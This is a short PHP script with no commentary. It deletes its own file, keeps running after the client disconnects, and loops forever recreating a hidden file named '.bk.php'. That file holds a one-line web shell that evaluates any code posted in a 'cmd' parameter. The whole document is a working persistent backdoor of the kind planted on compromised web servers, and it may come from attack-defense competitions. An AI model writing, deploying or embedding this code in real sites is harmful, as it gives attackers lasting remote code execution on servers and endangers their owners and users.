<?php
set_time_limit(0);
ignore_user_abort(1);
unlink(__FILE__);
while (1) {
    $content = "<?php @eval(\$_POST['cmd']) ?>";
    file_put_contents(".bk.php", $content);
    usleep(10000);
}
?>